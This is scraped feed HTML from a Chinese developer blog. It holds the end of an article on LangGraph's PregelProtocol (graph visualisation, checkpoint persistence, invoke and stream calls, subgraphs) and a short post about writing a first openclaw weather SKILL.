        base_url: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        proxies: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">bytes</span>
</code></pre>
<p>调用<code>reid</code>方法可以返回一个新的Graph对象，它尽量保留途中可读性的元素，但是Node的ID会重新生成。Graph的<code>first_node</code>和<code>last_node</code>方法返回第一个和最后一个Node。如果我们希望删除第一个只有单一输出Edge或者最后一个只有单一输入Edge的Node，可以调用<code>trim_first_node</code>或者<code>trim_last_node</code>方法。</p>
<p>构建好的Graph可以采用不同的呈现方式。Graph提供了五个“绘图”方法，其中<code>draw_ascii</code>和<code>print_ascii</code>采用ascii码字符的呈现方式，前者返回具体的ascii码字符串，后者则直接在终端将图绘制出来，这种方法不依赖其他的绘图相关的包。<code>draw_mermaid</code>和<code>draw_mermaid_png</code>采用Mermaid图表的呈现方式，Mermaid 是一种基于文本的流程图定义语言，广泛支持于 GitHub、Notion 和各种编辑器中。draw_mermaid返回图标文本，而<code>draw_mermaid_png</code>则直接将图表进一步渲染成PNG图片。Graph对象也可以通过调用<code>draw_png</code>方法渲染成PNG图片，该方法最终会Graphviz（一个开源的图可视化软件）来布局和渲染图片。</p>
<p>再回到PregelProtocol类型的定义上，它定义了如下所示的<code>get_graph/aget_graph</code>方法，它们的返回类型DrawableGraph正是上述Graph类型的别名。该方法除了可以传入RunnableConfig对象作为可选配置外，还具有一个名为<code>xray</code>的参数。xray（X光）参数决定了你在查看图结构时，到底能看多深。它专门用于处理子图的展开显示。如果设置为False（默认值），图将以 “黑盒” 模式显式，如果你的图中包含子图，它只会显示为一个单一的节点。你看不见子图内部的任何节点、边或逻辑。反之将会采用 “全展开” 模式，它会像 X 光一样穿透所有层级，将所有嵌套子图内部的节点和连线全部平铺出来。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.runnables.graph <span class="hljs-keyword">import</span> Graph <span class="hljs-keyword">as</span> DrawableGraph
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelProtocol</span>(Runnable[InputT, <span class="hljs-type">Any</span>], <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_graph</span>(<span class="hljs-params">
        self,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        xray: <span class="hljs-built_in">int</span> | <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,
    </span>) -&gt; DrawableGraph: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aget_graph</span>(<span class="hljs-params">
        self,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        xray: <span class="hljs-built_in">int</span> | <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,
    </span>) -&gt; DrawableGraph: ...
</code></pre>
<p>在第一个演示实例中，我们创建了一个作为“笑话生成器”的Agent，现在我们将它简化，看看由它生成的Graph如何将图的结构以可视化的形式呈现出来。如下面的代码片段所示，我们利用StateGraph作为Builder，构建了一张由两个Node组成的图，它们和Start和End之间有四条边。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langgraph.graph <span class="hljs-keyword">import</span> StateGraph, START, END
<span class="hljs-keyword">from</span> langgraph.pregel.protocol <span class="hljs-keyword">import</span> PregelProtocol
<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <span class="hljs-keyword">as</span> PILImage
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">from</span> langgraph.checkpoint.memory <span class="hljs-keyword">import</span> MemorySaver

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_joke</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">regenerate_joke</span>(<span class="hljs-params">state</span>):
    <span class="hljs-keyword">pass</span>

builder = (
    StateGraph(<span class="hljs-built_in">dict</span>)
    .add_node(<span class="hljs-string">"generate_joke"</span>, generate_joke)
    .add_node(<span class="hljs-string">"regenerate_joke"</span>, regenerate_joke)
)

builder.add_edge(START, <span class="hljs-string">"generate_joke"</span>)
builder.add_edge(<span class="hljs-string">"regenerate_joke"</span>, END)
builder.add_conditional_edges(
    <span class="hljs-string">"generate_joke"</span>, <span class="hljs-keyword">lambda</span> _: <span class="hljs-string">"bad"</span>, {<span class="hljs-string">"good"</span>: END, <span class="hljs-string">"bad"</span>: <span class="hljs-string">"regenerate_joke"</span>}
)

app: PregelProtocol = builder.<span class="hljs-built_in">compile</span>(MemorySaver())
graph = app.get_graph()
graph.print_ascii()

<span class="hljs-built_in">bytes</span> = graph.draw_mermaid_png()
PILImage.<span class="hljs-built_in">open</span>(io.BytesIO(<span class="hljs-built_in">bytes</span>)).show()
</code></pre>
<p>在将StateGraph编译成Pregel对象后，我们调用其get_graph方法得到对应的Graph对象。我们以两种形式呈现其结构，前者通过调用print_ascii方法以ASCII字符的形式输出图结构，后者调用draw_mermaid_png方法生成一张PNG图片。下图左右两部分分别展现了两种呈现方式的效果。</p>
<h2 data-id="heading-2">3. 持久化</h2>
<p>为了支持“中断/恢复”的执行方式，同时为“时间旅行”提供支持，图必须利用持久化的方式将执行过程的重要时刻的状态保存下来。LangGraph采用基于<code>Checkpoint</code>的持久化形式，对于指定的每个任务，不论是执行成功针对Channel的写入意图，还是抛出异常、人为中断或者Resume Value的提供，都会以Pending Write的形式被记录下来；当超步成功完成，针对Channel的写入被成功应用，这些Pending Write被丢弃，换来一个Checkpoint来描述当前的状态。</p>
<p>作为“LangGraph 执行体”的抽象，PregelProtocol定义了<code>get_state/aget_state</code>方法用于读取在某个Superstep由Checkpoint（对于最后一个未完成的Superstep，还包括Pending Write）构建的状态快照，该快照体现为一个StateSnapshot对象。<code>get_state_history/aget_state_history</code>返回由这些快照谱写的一段历史。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelProtocol</span>(Runnable[InputT, <span class="hljs-type">Any</span>], <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_state</span>(<span class="hljs-params">
        self, config: RunnableConfig, *, subgraphs: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    </span>) -&gt; StateSnapshot: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aget_state</span>(<span class="hljs-params">
        self, config: RunnableConfig, *, subgraphs: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    </span>) -&gt; StateSnapshot: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_state_history</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        *,
        <span class="hljs-built_in">filter</span>: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        before: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        limit: <span class="hljs-built_in">int</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; Iterator[StateSnapshot]: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">aget_state_history</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        *,
        <span class="hljs-built_in">filter</span>: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        before: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        limit: <span class="hljs-built_in">int</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; AsyncIterator[StateSnapshot]: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bulk_update_state</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        updates: <span class="hljs-type">Sequence</span>[<span class="hljs-type">Sequence</span>[StateUpdate]],
    </span>) -&gt; RunnableConfig: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">abulk_update_state</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        updates: <span class="hljs-type">Sequence</span>[<span class="hljs-type">Sequence</span>[StateUpdate]],
    </span>) -&gt; RunnableConfig: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_state</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        values: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span> | <span class="hljs-literal">None</span>,
        as_node: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; RunnableConfig: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aupdate_state</span>(<span class="hljs-params">
        self,
        config: RunnableConfig,
        values: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span> | <span class="hljs-literal">None</span>,
        as_node: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; RunnableConfig: ...
</code></pre>
<p>持久化存储的Checkpoint不仅使我们可以回顾历史，还可以提供“时间旅行”，使我们可以从某个历史时刻重新执行后面的流程。不仅如此，PregelProtocol还提供了<code>update_state /bulk_update_state/abulk_update_state</code>可以直接修改状态。但是它们并非“篡改历史”，只是基于某个在某个历史时刻开启了另一段“平行宇宙”而已。持久化使LangGraph.Pregel作为核心和部分，我们将在后续部分对它进行专门的介绍。</p>
<h2 data-id="heading-3">4. 两种调用方式</h2>
<p>PregelProtocol的<code>invoke/ainvoke</code>和<code>stream/astream</code>方法体现了针对 “LangGraph 执行体” 两种调用方式。前者采用简单的请求/回复消息交换模式，客户端需要等整个流程结束之后采用得到结果。如果整个处理流程比较复杂，或者涉及一些耗时的操作，过长的等待会带来糟糕的体验。后者采用流式处理使客户端可以实施得到处理的中间结果或者感知到处理的进度。我们将在后续部分对流式处理进行单独介绍。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelProtocol</span>(Runnable[InputT, <span class="hljs-type">Any</span>], <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">stream</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: InputT | Command | <span class="hljs-literal">None</span>,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        context: ContextT | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        stream_mode: StreamMode | <span class="hljs-built_in">list</span>[StreamMode] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_before: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_after: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        subgraphs: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,
    </span>) -&gt; Iterator[<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span>]: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">astream</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: InputT | Command | <span class="hljs-literal">None</span>,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        context: ContextT | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        stream_mode: StreamMode | <span class="hljs-built_in">list</span>[StreamMode] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_before: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_after: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        subgraphs: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,
    </span>) -&gt; AsyncIterator[<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span>]: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">invoke</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: InputT | Command | <span class="hljs-literal">None</span>,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        context: ContextT | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_before: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_after: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span>: ...

<span class="hljs-meta">    @abstractmethod</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">ainvoke</span>(<span class="hljs-params">
        self,
        <span class="hljs-built_in">input</span>: InputT | Command | <span class="hljs-literal">None</span>,
        config: RunnableConfig | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        *,
        context: ContextT | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_before: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
        interrupt_after: All | <span class="hljs-type">Sequence</span>[<span class="hljs-built_in">str</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
    </span>) -&gt; <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-type">Any</span>: ...
</code></pre>
<p>执行体支持中断/恢复（interrupt/resume）的方式执行，所以在中断时需要将当时的状态以 “Checkpoint（Checkpoint）” 的形式保存下来，恢复执行的时候利用它们将当时的 “执行线程” 复原。Checkpointing的机制也使 “时间旅行” 成为可能，我们可以从任一Checkpoint开始执行。也正是因为此持久化机制的存在，我们可以提取某一个Superstep的状态，还可以查看整个执行历史，这两个功能分别对应PregelProtocol的<code>get_state/aget_state</code>和<code>get_state_history/aget_state_history</code>方法。具体的状态以StateSnapshot对象描述的快照表示。</p>
<p>执行体应该具有将执行结果作为新的状态进行保存的能力，所以PregelProtocol定义了<code>update_state/aupdate_state</code>和<code>bulk_update_state/abulk_update_state</code>方法，前者保存单一状态更新，后者对多个状态更新进行批量执行。单一状态更新通过如下这个名为StateUpdate的命名元组表示，我们不仅可以利用values字段得到以字典形式表示的状态值，还可以通过<code>as_node</code>和<code>task_id</code>字段的得到实施更新的Node和具体任务标识。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">StateUpdate</span>(<span class="hljs-title class_ inherited__">NamedTuple</span>):
    values: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>] | <span class="hljs-literal">None</span>
    as_node: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
    task_id: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
</code></pre>
<p>执行体支持两种基本的操作，一种采用单纯的请求/响应消息交换模式，另一种以流的形式实时返回数据，它们分别对应<code>invoke/ainvoke</code>和<code>stream/astream</code>方法。</p>
<h2 data-id="heading-4">5. 嵌套结构</h2>
<p>我们一直在强调图的“嵌套”结构，这种结构也可以从Pregel、PregelNode和PregelProtocol在三个类型的定义。一个Pregel是PregelProtocol的实现、作为其节点的PregelNode对象可以由一个或者多个PregelProtocol组成，对于表示 “子图” 的subgraphs字段，并且该字段返回一个PregelProtocol对象的序列。Pregel的subgraphs方法返回的子图就来源于组成它的Node。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PregelNode</span>:
    subgraphs	: <span class="hljs-type">Sequence</span>[PregelProtocol]

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Pregel</span>(
    PregelProtocol[StateT, ContextT, InputT, OutputT],
    <span class="hljs-type">Generic</span>[StateT, ContextT, InputT, OutputT]):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_subgraphs</span>(<span class="hljs-params">
        self, *, namespace: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>, recurse: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    </span>) -&gt; Iterator[<span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">str</span>, PregelProtocol]]

    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">aget_subgraphs</span>(<span class="hljs-params">
        self, *, namespace: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>, recurse: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    </span>) -&gt; AsyncIterator[<span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">str</span>, PregelProtocol]]
</code></pre>
<p>PregelNode的subgraphs字段提供了 “子图” 的静态注册，其实任何一个Pregel对象都可以在无需注册前提下被另一个Pregel的Node调用，而且反映当前执行上下文的一些执行配置会通过上下文变量（ContenxtVars） “流向” 作为子图的Pregel对象。前面我们演示子图调用涉及的Checkpoint命名空间的例子已经充分体现了这一点。但是这种显式的静态声明对于图的静态图分析与可视化有着积极的作用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[自研第一个SKILL-openclaw入门]]></title>    <link>https://juejin.cn/post/7605848213603074094</link>    <guid>https://juejin.cn/post/7605848213603074094</guid>    <pubDate>2026-02-13T00:29:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213603074094" data-draft-id="7605848213603041326" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="自研第一个SKILL-openclaw入门"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-13T00:29:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iqiu"/> <meta itemprop="url" content="https://juejin.cn/user/1053802635204378"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            自研第一个SKILL-openclaw入门
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1053802635204378/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iqiu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T00:29:06.000Z" title="Fri Feb 13 2026 00:29:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">自研第一个SKILL-openclaw入门</h2>
<p>openclaw不是搭建好了就结束了，用起来才能发挥作用，而SKILL，就是openclaw的灵魂，是openclaw的内功。</p>
<p>所以准备慢慢记录学习openclaw的skill之路。</p>
<p>所谓读万卷书不如行万里路，实践对知识的理解非常重要，今天就准备自己开发一个简单的SKILL，来加深对SKILL的理解。</p>
<p>如果还不知道SKILL是什么，建议先看第一篇：</p>
<h3 data-id="heading-1">抄一个还是改一个</h3>
<p>学字先描红，开发先抄，cv程序员的称号不是白得的。</p>
<p>先看看这个：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2746c421c8df4407a40c38f944779e62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXFpdQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771547346&amp;x-signature=uDVR%2FgzwV9nI27H4gu13Y5%2FzMys%3D" alt="2.png" loading="lazy"/></p>
<p>openclaw毕竟是外国人开发的，默认的skill都是国外的，比如这个天气查询，先找到这个系统自带的skill看看：</p>
<p>这个skill位于系统内置skill的目录：</p>
<pre><code class="hljs language-bash" lang="bash">/app/skills/weather/SKILL.md
</code></pre>
<p>这个SKILL的内容：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/862bce102672405e9cbd4277ecc78d4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXFpdQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771547346&amp;x-signature=ZKGNoWjErPRbBrIK08t2EYsTxrw%3D" alt="3.png" loading="lazy"/>
一个查询天气的skill，还挺复杂，有主要的服务，还有备份的，可惜都是国外的服务，国人用就有点水土不服了，就以他为例，改成简单的国内的：</p>
<p>完整的代码如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b8a512e9d3046f38c82db144065ad87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXFpdQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771547346&amp;x-signature=TD8Zri6pumtgB%2FOaZOuBQByaau0%3D" alt="4.png" loading="lazy"/></p>
<p>需要重启gateway生效，然后问一下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8c45a0b4b674e599160b3e79654c1db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaXFpdQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771547346&amp;x-signature=PjrYVY8KTfpj71%2BEw%2BqnlmuKew0%3D" alt="1.png" loading="lazy"/></p>
<p>万事大吉了！</p>
<h3 data-id="heading-2">小结</h3>
<p>这是第一个自研的SKILL，功能不大，却也实用，再找一个免费的天气接口，作为备份，完善一下，就可以替代系统自带的天气SKILL了。</p>
